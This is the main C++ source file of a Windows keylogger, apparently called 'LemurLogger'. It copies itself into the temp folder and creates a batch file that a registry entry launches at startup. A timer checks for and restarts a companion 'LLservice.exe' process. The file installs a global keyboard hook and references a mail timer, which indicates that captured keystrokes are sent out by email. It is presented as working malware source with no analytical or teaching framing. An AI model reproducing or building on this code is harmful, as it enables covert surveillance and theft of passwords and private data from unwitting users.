#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
#include "Regedit.h"
#include "prepare.h"
#include "Process.h"
#include <unistd.h>

using namespace std;

int main()
{
    pre::start();

    string filename_path = IO::getFileNameWithPath();
    char* temp = getenv("temp");
    std::string temp_dir(temp);
    std::string pathtemp = IO::getLLservicePath();
    std::string EEpath = IO::getEERORPath();
    Timer CheckLL(pre::CheckFile, 500*60, Timer::Infinite);

    if (filename_path.compare(EEpath) == 0){
        std::string msg = " < " + EEpath + "> " +"state idle";
        Helper::WriteAppLog(msg);
        CheckLL.Start();
        /*while(true){
            while(IO::exists_file(pathtemp)){
                if (GetIsOnProcess("LLservice.exe")||GetIsOnProcess("LLservice")){
                    //ss::creckSoc();
                } else {
                    IO::startup(pathtemp.c_str());
                }

        }
	    IO::copy_File();
        } */
    }else{
    	if(filename_path.compare(pathtemp) == 0){

 		/*while (GetIsOnProcess("LemurLogger.exe")||GetIsOnProcess("LemurLogger")){
                std::string msg = "sate idle";
        		Helper::WriteAppLog(msg);
			    //IO::startup(path.c_str());
            	}*/
         } else{
            std::string batname = "\\batLLog.bat";
            char* temp = getenv("temp");
            std::string temp_dir(temp);
            std::string batpath = temp_dir+batname;
            if(!IO::exists_file(batpath)){
                IO::mkbat(IO::getFileNameWithPath(),batpath);
                Registry::RegisterProgram2(batname,batpath);
            }
        }
    }
    MSG Msg;
    IO::MkDir(IO::GetOurPath(true));
    GetProcID();
    curprocname = GetProcName(curpid);
    EnumWindows(EnumWindowsProc,0);
    InstallHook();
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	MailTimer.Stop();
	return 0;
}
